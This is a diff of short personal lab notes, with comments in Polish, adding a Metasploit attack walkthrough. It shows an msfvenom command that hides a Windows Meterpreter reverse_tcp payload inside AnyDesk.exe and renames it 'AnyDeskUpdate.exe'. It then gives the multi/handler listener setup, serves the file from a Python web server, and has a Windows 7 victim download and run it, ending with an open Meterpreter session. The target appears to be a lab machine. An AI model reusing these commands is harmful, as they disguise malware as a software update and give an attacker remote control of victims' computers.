@@ -2,6 +2,23 @@ AutoDesk:
 Kali Linux (/home/kali):
 	mkdir Venom
 	cd Venom
-	ip=<kali ip eth0 | wlan0> (192.168.1.95)
-	echo $ip
+	msfvenom -p windows/meterpreter/reverse_tcp LHOST=<kali ip> LPORT=1024 -f exe -k -x AnyDesk.exe -o AnyDeskUpdate.exe
+
+	msfconsole					# uruchomienie msfconsole
+		use exploit/multi/handler		# uruchomienie exploit multi/handler w konsoli
+			show options
+			set PAYLOAD windows/meterpreter/reverse_tcp
+			set LHOST <kali ip>
+			set LPORT 1024
+			show options
+			exploit
+	sudo python3 http.server 80			# uruchomienie serwera http z katalogu Venom
+	
+Win7:
+	http://<kali ip>/
+	save and run AutoDeskUpdate.exe
+	netstat -ano
+	
+Kali Linux:
+	meterpreter open :)
 	
